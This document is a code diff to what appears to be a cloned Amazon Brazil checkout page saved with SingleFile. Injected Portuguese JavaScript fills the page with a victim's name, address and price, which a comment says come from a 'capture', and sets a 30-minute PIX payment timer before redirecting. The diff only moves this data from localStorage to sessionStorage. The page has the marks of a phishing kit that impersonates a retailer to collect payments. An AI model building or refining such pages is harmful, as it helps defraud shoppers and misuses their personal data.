@@ -1,4 +1,4 @@
-<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
+﻿<!DOCTYPE html> <html lang=pt-br class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-gradients a-hires a-transform3d a-touch-scrolling a-android a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember-1-0-0 a-ember-modern-display-1-0-0 a-ember-modern-text-1-0-0 awa-browser wpn-supported" data-19ax5a9jf=mongoose data-aui-build-date=3.26.3-2026-04-04 style><!--
  Page saved with SingleFile 
  url: https://www.amazon.com.br/checkout/p/p-703-9642950-1659406/spc?pipelineType=Chewbacca&referrer=spc 
  saved date: Tue Apr 14 2026 12:29:51 GMT-0300 (Horário Padrão de Brasília)
@@ -2760,8 +2760,8 @@ document.addEventListener('DOMContentLoaded', function() {
     console.log('Iniciando Otimização Avançada da Fase 4...');
 
     // --- 1. Persistência de Dados (Nome e Endereço) ---
-    const userName = localStorage.getItem('user_name') || 'Cliente';
-    const userAddress = localStorage.getItem('user_full_address') || 'Endereço não informado';
+    const userName = sessionStorage.getItem('user_name') || 'Cliente';
+    const userAddress = sessionStorage.getItem('user_full_address') || 'Endereço não informado';
 
     const nameElement = document.getElementById('deliver-to-customer-text');
     if (nameElement) nameElement.innerText = 'Entrega para ' + userName;
@@ -2800,8 +2800,8 @@ document.addEventListener('DOMContentLoaded', function() {
     
     
     // --- 2. Sincronização Dinâmica de Preços ---
-    let priceWhole = localStorage.getItem('checkout_price_whole') || '4.510';
-    let priceFraction = localStorage.getItem('checkout_price_fraction') || '50';
+    let priceWhole = sessionStorage.getItem('checkout_price_whole') || '4.510';
+    let priceFraction = sessionStorage.getItem('checkout_price_fraction') || '50';
     
     // Remover vírgulas residuais que possam vir da captura
     priceWhole = priceWhole.replace(',', '').trim();
@@ -2893,7 +2893,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 stage: 'pix_redirect'
             });
         }
-        localStorage.setItem(pixTimerStorageKey, String(Date.now() + (30 * 60 * 1000)));
+        sessionStorage.setItem(pixTimerStorageKey, String(Date.now() + (30 * 60 * 1000)));
         window.location.href = targetPage;
     }
     
